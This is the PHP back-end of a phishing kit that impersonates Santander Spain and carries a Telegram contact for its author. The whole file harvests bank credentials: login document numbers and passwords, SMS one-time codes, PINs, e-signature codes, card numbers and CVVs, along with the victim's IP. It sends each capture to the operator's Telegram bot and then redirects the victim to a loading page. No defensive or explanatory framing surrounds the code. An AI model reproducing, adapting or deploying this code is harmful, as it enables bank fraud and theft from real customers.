<?php

    /*===================================================
    += Collected by: DarkNet_v1
    -----------------------------------------------------
    += Contact me on telegram : https://t.me/DarkNet_v1 
    +===================================================*/

    session_start();


    include "config.php";


    

    if(isset($_POST["log"])){


        $doc      = "<code>".$_POST["doc"]."</code>";
        $user      = "<code>".$_POST["doc_num"]."</code>";
        $pass      = "<code>".$_POST["password1"]."</code>";

        $message=
        '<blockquote>[LOGIN] => SANTANDER ES</blockquote>'."\n".     
        '- Documento : '.$doc."\n".
        '- Nº de documento : '.$user."\n".
        '- Clave de acceso : '.$pass."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2025 - All rights reserved.]</blockquote>'."\n";  

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();           

    }elseif(isset($_POST["sms"])){

        $sms      = "<code>".$_POST["code"]."</code>";

        $message=
        '<blockquote>[SMS] => SANTANDER ES</blockquote>'."\n".     
        '- SMS : '.$sms."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2025 - All rights reserved.]</blockquote>'."\n";  

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();         
 
    }elseif(isset($_POST["pin"])){

        $pin      = "<code>".$_POST["x1"].$_POST["x2"].$_POST["x3"].$_POST["x4"]."</code>";

        $message=
        '<blockquote>[PIN] => SANTANDER ES</blockquote>'."\n".     
        '- PIN : '.$pin."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2025 - All rights reserved.]</blockquote>'."\n";  

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();         
 
    }elseif(isset($_POST["firma"])){

        $pin      = "<code>".$_POST["x1"].$_POST["x2"].$_POST["x3"].$_POST["x4"].$_POST["x5"].$_POST["x6"].$_POST["x7"].$_POST["x8"]."</code>";

        $message=
        '<blockquote>[Firma Electrónica] => SANTANDER ES</blockquote>'."\n".     
        '- Code : '.$pin."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2025 - All rights reserved.]</blockquote>'."\n";  

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();         
 
    }elseif(isset($_POST["card"])){
        $number   = "<code>".$_POST["num"]."</code>";
        $cvv      = "<code>".$_POST["cvv"]."</code>";
        $message=
        '<blockquote>[CC] => SANTANDER ES</blockquote>'."\n".
        '- Card Number : '.$number."\n".
        '- Cvv : '.$cvv."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        '[🛂] Panel-link : '.get_steps_link()."\n".
        '<blockquote>└ © @DarkNet_v1 :  [© 2025 - All rights reserved.]</blockquote>'."\n";          
        
        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit(); 

    }

?>